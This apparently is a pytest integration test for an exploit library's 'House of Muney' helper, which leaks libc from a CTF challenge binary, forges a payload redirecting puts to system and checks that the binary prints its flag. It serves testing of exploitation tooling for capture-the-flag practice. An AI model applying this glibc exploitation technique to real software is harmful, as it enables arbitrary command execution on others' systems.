"""Integration test for House of Muney payload generation.

Compiles a tiny challenge binary that:
  1. Leaks stdout (→ libc base).
  2. Accepts an arbitrary munmap addr/size.
  3. mmaps the region back and reads user data into it.
  4. Calls ``puts("cat /flag.txt")``.

The test forges a payload via ``house_of_muney`` that redirects ``puts``
to ``system``, so the binary executes ``system("cat /flag.txt")`` and
prints the flag.
"""

from __future__ import annotations

import os
import pathlib

import pytest
from pwn import ELF, context, process

from doglib.muney import house_of_muney

TESTS_DIR = pathlib.Path(__file__).resolve().parent


@pytest.fixture(autouse=True)
def _quiet_pwntools():
    prev = context.log_level
    context.log_level = "error"
    yield
    context.log_level = prev


@pytest.fixture()
def challenge():
    """Return (exe, libc) ELF pair for the muney challenge."""
    exe = ELF(str(TESTS_DIR / "muney_patched"), checksec=False)
    libc = ELF(str(TESTS_DIR / "libc.so.6"), checksec=False)
    return exe, libc


def test_house_of_muney_puts_to_system(challenge):
    exe, libc = challenge

    p = process([exe.path], cwd=str(TESTS_DIR))
    try:
        p.recvuntil(b"stdout: ")
        stdout_addr = int(p.recvline().strip(), 16)
        libc.address = stdout_addr - libc.symbols["_IO_2_1_stdout_"]

        payload = house_of_muney(libc, {"puts": libc.symbols["system"]})

        munmap_addr = libc.address
        munmap_size = len(payload)

        p.sendafter(b"munmap addr:", hex(munmap_addr).encode().ljust(0xF, b"\x00"))
        p.sendafter(b"munmap size:", hex(munmap_size).encode().ljust(0xF, b"\x00"))

        p.recvuntil(b"munmap success")
        p.send(payload)

        result = p.recvall(timeout=5)
        assert b"dogctf{okuwinlol}" in result, f"flag not found in output: {result!r}"
    finally:
        p.close()
